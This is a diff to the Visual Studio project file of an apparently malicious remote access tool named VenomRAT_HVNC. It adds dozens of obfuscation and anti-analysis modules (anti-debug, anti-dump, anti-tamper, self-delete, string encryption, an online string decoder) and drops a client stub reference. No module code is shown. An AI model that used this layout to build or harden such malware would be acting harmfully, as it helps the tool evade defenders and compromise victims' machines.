@@ -9,7 +9,7 @@
     <RootNamespace>VenomRAT_HVNC</RootNamespace>
     <AssemblyName>VenomRAT_HVNC</AssemblyName>
     <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
-    <langversion>9</langversion>
+    <langversion>10</langversion>
     <FileAlignment>512</FileAlignment>
     <ApplicationManifest>app.manifest</ApplicationManifest>
     <ApplicationIcon>VenomRAT_HVNC.ico</ApplicationIcon>
@@ -68,9 +68,6 @@
     </Reference>
     <Reference Include="cGeoIp">
       <HintPath>..\DLLS\DLLS\cGeoIp.dll</HintPath>
-    </Reference>
-    <Reference Include="Client">
-      <HintPath>..\DLLS\Stub\Client.exe</HintPath>
     </Reference>
     <Reference Include="dnlib">
       <HintPath>..\DLLS\DLLS\dnlib.dll</HintPath>
@@ -440,6 +437,63 @@
       <SubType>Code</SubType>
     </Compile>
     <Compile Include="KeyAuth\json_wrapper.cs" />
+    <Compile Include="Obfuscation\Obfuscate.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Anti Debug.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Anti Dump.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Anti Tamper.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\AntiDe4dot.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Antimanything.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Runtime\AntiDebug.Safe.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Runtime\AntiDumpRun.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Runtime\EOFAntiTamper.cs" />
+    <Compile Include="Obfuscation\Protection\Anti\Runtime\SelfDeleteClass.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Arithmetic.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\ArithmeticEmulator.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\ArithmeticTypes.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\ArithmeticVT.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Add.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Div.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Abs.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Ceiling.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Cos.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Floor.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Log.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Log10.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Round.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Sin.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Sqrt.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Tan.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Tanh.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Maths\Truncate.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Mul.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Sub.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Functions\Xor.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Generator\Generator.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\iFunction.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Token.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Utils\ArithmeticUtils.cs" />
+    <Compile Include="Obfuscation\Protection\Arithmetic\Value.cs" />
+    <Compile Include="Obfuscation\Protection\CtrlFlow\Block.cs" />
+    <Compile Include="Obfuscation\Protection\CtrlFlow\BlockParser.cs" />
+    <Compile Include="Obfuscation\Protection\CtrlFlow\ControlFlowObfuscation.cs" />
+    <Compile Include="Obfuscation\Protection\CtrlFlow\JumpCFlow.cs" />
+    <Compile Include="Obfuscation\Protection\INT\AddIntPhase.cs" />
+    <Compile Include="Obfuscation\Protection\InvalidMD\InvalidMDPhase.cs" />
+    <Compile Include="Obfuscation\Protection\InvalidMD\MindLated.png.cs" />
+    <Compile Include="Obfuscation\Protection\LocalF\L2F.cs" />
+    <Compile Include="Obfuscation\Protection\LocalF\L2FV2.cs" />
+    <Compile Include="Obfuscation\Protection\Other\Calli.cs" />
+    <Compile Include="Obfuscation\Protection\Other\StackUnfConfusion.cs" />
+    <Compile Include="Obfuscation\Protection\Other\Watermark.cs" />
+    <Compile Include="Obfuscation\Protection\Proxy\ProxyINT.cs" />
+    <Compile Include="Obfuscation\Protection\Proxy\ProxyMeth.cs" />
+    <Compile Include="Obfuscation\Protection\Proxy\ProxyString.cs" />
+    <Compile Include="Obfuscation\Protection\Renamer\RenamerPhase.cs" />
+    <Compile Include="Obfuscation\Protection\StringOnline\OnlinePhase.cs" />
+    <Compile Include="Obfuscation\Protection\StringOnline\OnlineStringClass.cs" />
+    <Compile Include="Obfuscation\Protection\String\EncryptionHelper.cs" />
+    <Compile Include="Obfuscation\Protection\String\StringEncPhase.cs" />
+    <Compile Include="Obfuscation\Services\InjectHelper.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Properties\Resources.Designer.cs">
       <AutoGen>True</AutoGen>
@@ -719,6 +773,9 @@
       <Generator>SettingsSingleFileGenerator</Generator>
       <LastGenOutput>Settings.Designer.cs</LastGenOutput>
     </None>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="Obfuscation\Protection\StringOnline\Decoder.php" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
